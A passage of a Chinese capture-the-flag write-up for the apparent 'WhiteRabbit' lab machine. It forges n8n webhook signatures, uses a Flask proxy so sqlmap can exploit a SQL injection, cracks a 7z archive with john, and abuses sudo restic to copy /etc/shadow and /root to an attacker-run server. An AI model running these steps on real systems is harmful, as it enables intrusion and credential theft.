class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"DEBUG: REMOVE SOON"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"main"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"node"</span><span class="punctuation">:</span> <span class="string">"Stop"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"main"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"index"</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">          <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span></span><br><span class="line">  <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"active"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"settings"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"executionOrder"</span><span class="punctuation">:</span> <span class="string">"v1"</span></span><br><span class="line">  <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"versionId"</span><span class="punctuation">:</span> <span class="string">"803dfe3a-9d37-4e37-8a74-9281cf6aad25"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"meta"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"templateCredsSetupCompleted"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"instanceId"</span><span class="punctuation">:</span> <span class="string">"21894d8ad64e6c729da4131f6f85c4f5b635dd24a4cd990abd2d7df2c0b9c3e5"</span></span><br><span class="line">  <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"WDCH0NwAZIztoV3u"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"tags"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"createdAt"</span><span class="punctuation">:</span> <span class="string">"2024-08-28T11:11:04.551Z"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"updatedAt"</span><span class="punctuation">:</span> <span class="string">"2024-08-28T11:11:04.551Z"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"EXjKCJjO0OPsnJqx"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"database"</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"createdAt"</span><span class="punctuation">:</span> <span class="string">"2024-08-28T11:11:02.744Z"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"updatedAt"</span><span class="punctuation">:</span> <span class="string">"2024-08-28T11:11:02.744Z"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"JuPt3zEtHwmK6jur"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"gophish"</span></span><br><span class="line">    <span class="punctuation">}</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure>

<p>分析一下，，首先是请求<code>Webhook</code>，也就是发送POST请求到<code>http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d</code></p>
<figure class="highlight json"><table><tbody><tr><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"httpMethod"</span><span class="punctuation">:</span> <span class="string">"POST"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"path"</span><span class="punctuation">:</span> <span class="string">"d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"responseMode"</span><span class="punctuation">:</span> <span class="string">"responseNode"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"e425306c-06ba-441b-9860-170433602b1a"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Webhook"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.webhook"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">220</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">440</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"webhookId"</span><span class="punctuation">:</span> <span class="string">"d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br></pre></td></tr></tbody></table></figure>

<p>然后是签名部分，也就是<code>HMAC_SHA256(request_body, secret)</code>，这里<code>secret</code>为<code>3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS</code></p>
<figure class="highlight json"><table><tbody><tr><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"action"</span><span class="punctuation">:</span> <span class="string">"hmac"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"SHA256"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"value"</span><span class="punctuation">:</span> <span class="string">"={{ JSON.stringify($json.body) }}"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"dataPropertyName"</span><span class="punctuation">:</span> <span class="string">"calculated_signature"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"secret"</span><span class="punctuation">:</span> <span class="string">"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"e406828a-0d97-44b8-8798-6d066c4a4159"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Calculate the signature"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.crypto"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">860</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">340</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure>

<p>用户检查部分，按邮箱查询，而使用<code>{{ $json.body.email }}</code>的方式拼接sql语句，显然存在sql注入。</p>
<figure class="highlight json"><table><tbody><tr><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">     <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">       <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"executeQuery"</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">"query"</span><span class="punctuation">:</span> <span class="string">"SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1"</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">     <span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure>

<p>尝试伪造签名</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">secret = <span class="string">b"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"test.json"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    body = json.dumps(json.load(f), separators=(<span class="string">','</span>, <span class="string">':'</span>))</span><br><span class="line">sig = hmac.new(secret, body.encode(), hashlib.sha256).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(sig)</span><br><span class="line"></span><br><span class="line"><span class="comment"># {</span></span><br><span class="line"><span class="comment">#   "campaign_id": 1,</span></span><br><span class="line"><span class="comment">#   "email": "test@ex.com",</span></span><br><span class="line"><span class="comment">#   "message": "Clicked Link"</span></span><br><span class="line"><span class="comment"># }</span></span><br><span class="line"><span class="comment"># cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd</span></span><br></pre></td></tr></tbody></table></figure>

<p>发送请求</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ <span class="built_in">export</span> sign=<span class="string">"sha256=cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd"</span></span><br><span class="line">$ curl -X POST http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d \</span><br><span class="line"> -H <span class="string">"Content-Type: application/json"</span> \</span><br><span class="line"> -H <span class="string">"x-gophish-signature: <span class="variable">$sign</span>"</span> \</span><br><span class="line"> --data @test.json</span><br><span class="line">Info: User is not <span class="keyword">in</span> database</span><br></pre></td></tr></tbody></table></figure>

<h2 id="flask代理sqlmap"><a href="#flask代理sqlmap" class="headerlink" title="flask代理sqlmap"></a>flask代理sqlmap</h2><p>可以发现成功伪造了签名，到达了用户检查部分。那么现在只需要尝试进行sql注入即可。可以使用flask代理</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secret = <span class="string">"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"</span></span><br><span class="line">url = <span class="string">"http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hmac_body</span>(<span class="params">body: <span class="built_in">dict</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    body_str = json.dumps(body, separators=(<span class="string">','</span>, <span class="string">':'</span>))</span><br><span class="line">    sign = hmac.new(secret.encode(), body_str.encode(), hashlib.sha256).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> sign</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/'</span>, methods=[<span class="string">'GET'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    email = request.args.get(<span class="string">'email'</span>)</span><br><span class="line">    body = {</span><br><span class="line">      <span class="string">"campaign_id"</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="string">"email"</span>: email,</span><br><span class="line">      <span class="string">"message"</span>: <span class="string">"Clicked Link"</span></span><br><span class="line">    }</span><br><span class="line">    sign = hmac_body(body)</span><br><span class="line">    headers = {</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>,</span><br><span class="line">        <span class="string">"x-gophish-signature"</span>: <span class="string">f"sha256=<span class="subst">{sign}</span>"</span></span><br><span class="line">    }</span><br><span class="line">    res = requests.post(url, headers=headers, json=body)</span><br><span class="line">    res.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(port=<span class="number">12345</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></tbody></table></figure>

<p>然后使用sqlmap注入，成功注入</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ sqlmap -u <span class="string">"http://127.0.0.1:12345/?email=1"</span> -p email -v 3 --batch </span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/25594414/image-20250407233737421.png" class="" title="image-20250407233737421">

<p>爆库名</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ sqlmap -u <span class="string">"http://127.0.0.1:12345/?email=1"</span> -p email -v 3 --dbs --batch </span><br><span class="line">available databases [3]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] phishing</span><br><span class="line">[*] temp</span><br></pre></td></tr></tbody></table></figure>

<p>然后就是翻数据库，在<code>phishing</code>库里只有一堆邮箱，没啥用</p>
<img src="/posts/25594414/image-20250407234122553.png" class="" title="image-20250407234122553">

<p>在<code>temp</code>库有表名为<code>command_log</code>，疑似有历史命令执行记录，爆破一下</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ sqlmap -u <span class="string">"http://127.0.0.1:12345/?email=1"</span> -p email -v 3 -D temp -T command_log --dump --batch </span><br><span class="line">+----+---------------------+------------------------------------------------------------------------------+</span><br><span class="line">| <span class="built_in">id</span> | <span class="built_in">date</span>                | <span class="built_in">command</span>                                                                      |</span><br><span class="line">+----+---------------------+------------------------------------------------------------------------------+</span><br><span class="line">| 1  | 2024-08-30 10:44:01 | <span class="built_in">uname</span> -a                                                                     |</span><br><span class="line">| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb                     |</span><br><span class="line">| 3  | 2024-08-30 11:58:36 | <span class="built_in">echo</span> ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw &gt; .restic_passwd                       |</span><br><span class="line">| 4  | 2024-08-30 11:59:02 | <span class="built_in">rm</span> -rf .bash_history                                                         |</span><br><span class="line">| 5  | 2024-08-30 11:59:47 | <span class="comment">#thatwasclose                                                                |</span></span><br><span class="line">| 6  | 2024-08-30 14:40:42 | <span class="built_in">cd</span> /home/neo/ &amp;&amp; /opt/neo-password-generator/neo-password-generator | passwd |</span><br><span class="line">+----+---------------------+------------------------------------------------------------------------------+</span><br></pre></td></tr></tbody></table></figure>

<h2 id="Restic到SSH登录"><a href="#Restic到SSH登录" class="headerlink" title="Restic到SSH登录"></a>Restic到SSH登录</h2><p><code>Restic</code>是一款备份工具，首先启动了<code>restic</code>服务，域名为<code>75951e6ff.whiterabbit.htb</code>，然后将密码<code>ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw</code>存到<code>.restic_passwd </code>，之后删除历史记录，生成新的密码存入管道<code>passwd</code>中。</p>
<p>这里需要与<code>Restic</code>交互，下载文件<a href="https://github.com/restic/restic/releases/download/v0.16.4/restic_0.16.4_linux_amd64.bz2">Restic</a>，获取快照</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ ./restic_0.16.4_linux_amd64 -r rest:http://75951e6ff.whiterabbit.htb snapshots</span><br><span class="line">enter password <span class="keyword">for</span> repository: </span><br><span class="line">repository 5b26a938 opened (version 2, compression level auto)</span><br><span class="line">created new cache <span class="keyword">in</span> /home/kali/.cache/restic</span><br><span class="line">ID        Time                 Host         Tags        Paths</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">272cacd5  2025-03-06 19:18:40  whiterabbit              /dev/shm/bob/ssh</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">1 snapshots</span><br></pre></td></tr></tbody></table></figure>

<p><code>/dev/shm/bob/ssh</code>文件中可能存在<code>ssh</code>秘钥，尝试恢复快照</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ ./restic_0.16.4_linux_amd64 -r rest:http://75951e6ff.whiterabbit.htb restore 272cacd5 --target ./backup</span><br><span class="line">$ tree backup</span><br><span class="line">backup</span><br><span class="line">└── dev</span><br><span class="line">    └── shm</span><br><span class="line">        └── bob</span><br><span class="line">            └── ssh</span><br><span class="line">                └── bob.7z</span><br></pre></td></tr></tbody></table></figure>

<p>显然<code>bob.7z</code>里面有好东西，尝试解压</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ 7z x backup/dev/shm/bob/ssh/bob.7z </span><br><span class="line"></span><br><span class="line">7-Zip 24.07 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-06-19</span><br><span class="line"> 64-bit locale=zh_CN.UTF-8 Threads:32 OPEN_MAX:1024</span><br><span class="line"></span><br><span class="line">Scanning the drive <span class="keyword">for</span> archives:</span><br><span class="line">1 file, 572 bytes (1 KiB)</span><br><span class="line"></span><br><span class="line">Extracting archive: backup/dev/shm/bob/ssh/bob.7z</span><br><span class="line">--</span><br><span class="line">Path = backup/dev/shm/bob/ssh/bob.7z</span><br><span class="line">Type = 7z</span><br><span class="line">Physical Size = 572</span><br><span class="line">Headers Size = 204</span><br><span class="line">Method = LZMA2:12 7zAES</span><br><span class="line">Solid = +</span><br><span class="line">Blocks = 1</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">Enter password (will not be echoed):</span><br><span class="line">ERROR: Data Error <span class="keyword">in</span> encrypted file. Wrong password? : bob</span><br><span class="line">ERROR: Data Error <span class="keyword">in</span> encrypted file. Wrong password? : bob.pub</span><br><span class="line">ERROR: Data Error <span class="keyword">in</span> encrypted file. Wrong password? : config</span><br><span class="line">             </span><br><span class="line">Sub items Errors: 3</span><br><span class="line"></span><br><span class="line">Archives with Errors: 1</span><br><span class="line"></span><br><span class="line">Sub items Errors: 3</span><br></pre></td></tr></tbody></table></figure>

<p>这里使用了<code>7zAES</code>加密，<code>bob</code>为私钥，<code>bob.pub</code>为公钥，<code>config</code>为配置文件</p>
<p>使用<code>john</code>工具爆破密码</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ 7z2john backup/dev/shm/bob/ssh/bob.7z &gt; bob.hash</span><br><span class="line">$ <span class="built_in">cat</span> bob.hash</span><br><span class="line">bob.7z:$7z$2$19$0$$8$61d81f6f9997419d0000000000000000$4049814156$368$365$7295a784b0a8cfa7d2b0a8a6f88b961c8351682f167ab77e7be565972b82576e7b5ddd25db30eb27137078668756bf9dff5ca3a39ca4d9c7f264c19a58981981486a4ebb4a682f87620084c35abb66ac98f46fd691f6b7125ed87d58e3a37497942c3c6d956385483179536566502e598df3f63959cf16ea2d182f43213d73feff67bcb14a64e2ecf61f956e53e46b17d4e4bc06f536d43126eb4efd1f529a2227ada8ea6e15dc5be271d60360ff5c816599f0962fc742174ff377e200250b835898263d997d4ea3ed6c3fc21f64f5e54f263ebb464e809f9acf75950db488230514ee6ed92bd886d0a9303bc535ca844d2d2f45532486256fbdc1f606cca1a4680d75fa058e82d89fd3911756d530f621e801d73333a0f8419bd403350be99740603dedff4c35937b62a1668b5072d6454aad98ff491cb7b163278f8df3dd1e64bed2dac9417ca3edec072fb9ac0662a13d132d7aa93ff58592703ec5a556be2c0f0c5a3861a32f221dcb36ff3cd713$399<span class="variable">$00</span></span><br><span class="line"></span><br><span class="line">$ john --show bob.hash </span><br><span class="line">bob.7z:1q2w3e4r5t6y</span><br><span class="line">1 password <span class="built_in">hash</span> cracked, 0 left</span><br></pre></td></tr></tbody></table></figure>

<p>获取到密码为<code>1q2w3e4r5t6y</code>，解压文件</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ 7z x backup/dev/shm/bob/ssh/bob.7z </span><br></pre></td></tr></tbody></table></figure>

<p>使用解压出的秘钥进行登录，成功登录</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> config</span><br><span class="line">Host whiterabbit</span><br><span class="line">  HostName whiterabbit.htb</span><br><span class="line">  Port 2222</span><br><span class="line">  User bob</span><br><span class="line"></span><br><span class="line">$ ssh -i bob bob@whiterabbit.htb -p 2222</span><br><span class="line">The authenticity of host <span class="string">'[whiterabbit.htb]:2222 ([10.10.11.63]:2222)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:jWKKPrkxU01KGLZeBG3gDZBIqKBFlfctuRcPBBG39sA.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added '</span>[whiterabbit.htb]:2222<span class="string">' (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-57-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/pro</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This system has been minimized by removing packages and content that are</span></span><br><span class="line"><span class="string">not required on a system that users do not log into.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">To restore this content, you can run the '</span>unminimize<span class="string">' command.</span></span><br><span class="line"><span class="string">Last login: Mon Apr  7 15:50:37 2025 from 10.10.16.80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bob@ebdce80611e9:~$ hostname</span></span><br><span class="line"><span class="string">ebdce80611e9</span></span><br><span class="line"><span class="string">bob@ebdce80611e9:~$ uname -a</span></span><br><span class="line"><span class="string">Linux ebdce80611e9 6.8.0-57-generic #59-Ubuntu SMP PREEMPT_DYNAMIC Sat Mar 15 17:40:59 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></tbody></table></figure>

<p>但是看着是在容器里面，那么得尝试逃逸到宿主机。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">bob@ebdce80611e9:~$ <span class="built_in">cat</span> /etc/hosts</span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::  ip6-localnet</span><br><span class="line">ff00::  ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line">172.17.0.2      ebdce80611e9</span><br></pre></td></tr></tbody></table></figure>

<p><code>172.17.0.0/24</code>是<code>Docker</code>默认子网网桥，因此处于非特权容器。</p>
<p>查看<code>sudo</code>权限</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">bob@ebdce80611e9:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> bob on ebdce80611e9:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User bob may run the following commands on ebdce80611e9:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/restic</span><br></pre></td></tr></tbody></table></figure>

<h2 id="通过Restic获取敏感文件逃逸到宿主机"><a href="#通过Restic获取敏感文件逃逸到宿主机" class="headerlink" title="通过Restic获取敏感文件逃逸到宿主机"></a>通过Restic获取敏感文件逃逸到宿主机</h2><p>可以以任何权限运行<code>Restic</code>，并且无需密码。那么可以尝试在攻击机开启一个<code>Restic</code>服务，让<code>Bob</code>将敏感文件备份到攻击机，<a href="https://github.com/restic/rest-server/releases/download/v0.12.1/rest-server_0.12.1_linux_amd64.tar.gz">下载地址</a></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ tar -zxvf rest-server_0.12.1_linux_amd64.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> rest-server_0.12.1_linux_amd64</span><br><span class="line">$ <span class="built_in">chmod</span> +x rest-server </span><br><span class="line">$ <span class="built_in">mkdir</span> -p ./restic_repo/test	<span class="comment"># 创建备份库</span></span><br><span class="line">$ ./restic_0.16.4_linux_amd64 init -r ./restic/rest-server_0.12.1_linux_amd64/restic_repo/test	<span class="comment"># 初始化</span></span><br><span class="line">$ ./rest-server --path ./restic_repo --no-auth --listen :23456 </span><br><span class="line">Data directory: ./restic_repo</span><br><span class="line">Authentication disabled</span><br><span class="line">Private repositories disabled</span><br><span class="line">start server on :23456</span><br></pre></td></tr></tbody></table></figure>

<p>切换到容器内</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">bob@ebdce80611e9:~$ <span class="built_in">sudo</span> restic backup -r rest:http://10.10.16.86:23456/test /etc/shadow</span><br><span class="line">repository 611ac403 opened (version 2, compression level auto)</span><br><span class="line">created new cache <span class="keyword">in</span> /root/.cache/restic</span><br><span class="line">no parent snapshot found, will <span class="built_in">read</span> all files</span><br><span class="line">[0:00]          0 index files loaded</span><br><span class="line"></span><br><span class="line">Files:           1 new,     0 changed,     0 unmodified</span><br><span class="line">Dirs:            1 new,     0 changed,     0 unmodified</span><br><span class="line">Added to the repository: 1.405 KiB (940 B stored)</span><br><span class="line"></span><br><span class="line">processed 1 files, 737 B <span class="keyword">in</span> 0:02</span><br><span class="line">snapshot 0ed726a0 saved</span><br></pre></td></tr></tbody></table></figure>

<p>到攻击机读取，发现成功读取</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ ./restic_0.16.4_linux_amd64 -r ./restic/rest-server_0.12.1_linux_amd64/restic_repo/test dump latest /etc/shadow</span><br><span class="line">enter password <span class="keyword">for</span> repository: </span><br><span class="line">repository 611ac403 opened (version 2, compression level auto)</span><br><span class="line">created new cache <span class="keyword">in</span> /home/kali/.cache/restic</span><br><span class="line">[0:00] 100.00%  1 / 1 index files loaded</span><br><span class="line">root:*:19936:0:99999:7:::</span><br><span class="line">daemon:*:19936:0:99999:7:::</span><br><span class="line">bin:*:19936:0:99999:7:::</span><br><span class="line">sys:*:19936:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19936:0:99999:7:::</span><br><span class="line">games:*:19936:0:99999:7:::</span><br><span class="line">man:*:19936:0:99999:7:::</span><br><span class="line">lp:*:19936:0:99999:7:::</span><br><span class="line">mail:*:19936:0:99999:7:::</span><br><span class="line">news:*:19936:0:99999:7:::</span><br><span class="line">uucp:*:19936:0:99999:7:::</span><br><span class="line">proxy:*:19936:0:99999:7:::</span><br><span class="line">www-data:*:19936:0:99999:7:::</span><br><span class="line">backup:*:19936:0:99999:7:::</span><br><span class="line">list:*:19936:0:99999:7:::</span><br><span class="line">irc:*:19936:0:99999:7:::</span><br><span class="line">_apt:*:19936:0:99999:7:::</span><br><span class="line">nobody:*:19936:0:99999:7:::</span><br><span class="line">ubuntu:!:19936:0:99999:7:::</span><br><span class="line">systemd-network:!*:19965::::::</span><br><span class="line">systemd-timesync:!*:19965::::::</span><br><span class="line">messagebus:!:19965::::::</span><br><span class="line">systemd-resolve:!*:19965::::::</span><br><span class="line">sshd:!:19965::::::</span><br><span class="line">bob:$y$j9T<span class="variable">$dC8deJ6oyvhG7RBktETA3</span>/<span class="variable">$VtU7l9Xdd6ADMrq64PBV2Ev68xpYQ9IDycSiHL7v9h7</span>:19965:0:99999:7:::</span><br></pre></td></tr></tbody></table></figure>

<p>然后备份<code>/root</code>目录并读取</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">bob@ebdce80611e9:~$ <span class="built_in">sudo</span> restic backup -r rest:http://10.10.16.86:23456/test /root</span><br><span class="line">$ ./restic_0.16.4_linux_amd64 -r ./restic/rest-server_0.12.1_linux_amd64/restic_repo/test <span class="built_in">ls</span> latest              </span><br><span class="line">repository 611ac403 opened (version 2, compression level auto)</span><br><span class="line">[0:00] 100.00%  2 / 2 index files loaded</span><br><span class="line">snapshot bbe202ec of [/root] filtered by [] at 2025-04-07 16:25:00.235977286 +0000 UTC):</span><br><span class="line">/root</span><br><span class="line">/root/.bash_history</span><br><span class="line">/root/.bashrc</span><br><span class="line">/root/.cache</span><br><span class="line">/root/.profile</span><br><span class="line">/root/.ssh</span><br><span class="line">/root/morpheus</span><br><span class="line">/root/morpheus.pub</span><br></pre></td></tr></tbody></table></figure>

<p>这里的<code>/root</code>是宿主机的root目录，可以尝试ssh登录</p>
